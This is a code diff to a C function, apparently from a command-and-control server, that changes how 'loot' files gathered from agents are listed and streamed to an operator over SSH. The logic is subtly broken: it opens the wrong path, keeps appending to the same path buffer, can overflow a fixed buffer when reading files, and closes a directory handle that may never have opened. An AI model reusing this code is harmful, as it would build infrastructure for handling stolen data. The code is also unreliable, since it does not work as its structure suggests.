@@ -209,9 +209,12 @@ void manager_handler(struct clientNode *node){
     int quitting = 0;
     int size = 0;
     int size_e = 0;
+    int read = 0;
+    int count = 0;
     char *ptr = NULL;
     char *dat_ptr = NULL;
     char buff[BUFSIZ];
+    char data_buffer[BUFSIZ];
     char tmpbuffer[8];
     char filename[2048];
     char name[BUFSIZ];
@@ -246,7 +249,7 @@ void manager_handler(struct clientNode *node){
         char tmpbf[3] = {0,0,0};
         strncat(tmpbf,resp,2);
         operation = atoi(tmpbf);
-        ptr += 2;
+        ptr += 3;
         
         /*
         Command data structure:
@@ -274,35 +277,76 @@ void manager_handler(struct clientNode *node){
 
         case MANAG_GET_LOOT:
             
-            printf("Manager %s: Sending file -> %s\n", manager->id, ptr);
+            printf("Manager %s: Sending Loot -> %s\n", manager->id, ptr);
             memset(buff, 0, sizeof(buff));
-            tmpbuffer[7] = '\0';
-            
-            // get filesize 
-            size = get_file(ptr, &dat_ptr);
-            
-            if(size < 0){
-                printf("Manager %s: filename '%s' does not exist\n", manager->id, buff); 
-                ssh_channel_write(manager->chan, "er", 3);
-                break;
+            memset(name, 0, sizeof(name));
+            read = 0;
+            count = 0;
+            memset(data_buffer, 0,sizeof(data_buffer));
+            sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), ptr);
+                     
+            if((dir = opendir(buff)) != NULL){
+                while((ent =readdir(dir)) != NULL){
+                    if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
+                        continue;
+                    } else {
+                        count++;
+                    }
+                }
             }
-            memset(buff, 0, sizeof(buff));
-            size_e = b64_encoded_size(size);
-            sprintf(tmpbuffer, "%d", size_e);
-            
-            // writes file size
-            ssh_channel_write(manager->chan, tmpbuffer, sizeof(tmpbuffer));
-            ssh_channel_read(manager->chan, buff, sizeof(buff), 0);
-            
-            ptr = b64_encode((unsigned char *)dat_ptr, size);
-            
-            // writes file 
-            rc = ssh_channel_write(manager->chan, ptr, size_e);
-            if(rc == SSH_ERROR){
-                printf("Tada you found it: %s\n", ssh_get_error(manager->session));
-            }
-            printf("Manager %s: Sent file successfully\n", manager->id);
+            closedir(dir);
+            memset(name, 0, sizeof(name));
+            sprintf(name, "%d", count);
+            ssh_channel_write(manager->chan, name, strlen(name));
+            ssh_channel_read(manager->chan, tmpbf, 3, 0);//rd
 
+            if ((dir = opendir(buff)) != NULL) {
+                /* print all the files and directories within directory */
+                while ((ent = readdir (dir)) != NULL) {
+                    if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..")){
+                        continue;
+                    } else {
+                        strcat(buff, "/");
+                        strcat(buff, ent->d_name);
+                        file = fopen(name, "r");
+                        ssh_channel_write(manager->chan, ent->d_name, sizeof(ent->d_name));
+                        ssh_channel_read(manager->chan, tmpbf, 3, 0); //ok
+                        if(file == NULL){
+                            printf("Manager %s: Could not read loot file %s\n", manager->id, buff);
+                            perror("Got here");
+                        } else {
+                            memset(buff, 0, sizeof(buff));
+                            printf("File opened successfully\n");
+                            fseek(file, 0L, SEEK_END);
+                            size = ftell(file);
+                            printf("Size: %d\n", size);
+                            rewind(file);
+                            memset(buff, 0, 256);
+                            sprintf(buff, "%d", size);
+                            ssh_channel_write(manager->chan, buff, strlen(buff));
+                            ssh_channel_read(manager->chan, tmpbf, 3, 0);//ok
+                            do
+                            {
+                                memset(buff, 0, sizeof(buff));
+                                read += fread(buff, 1, size, file);
+                                ssh_channel_write(manager->chan, buff, sizeof(buff));
+                                ssh_channel_read(manager->chan, tmpbf, 3, 0);
+                                printf("Size: %d, read: %d\n", size, read);//ok
+                                
+                            } while (read < size);
+
+                            ssh_channel_write(manager->chan, "nx", 3);
+                            ssh_channel_read(manager->chan, tmpbf, 3, 0); //rd
+                        }
+                    }
+                }
+                ssh_channel_write(manager->chan, "fi", 2);
+                closedir (dir);
+            } else {
+                /* could not open directory */
+                perror ("");
+                return;
+            }
             break;
 
         case MANAG_UP_FILE:
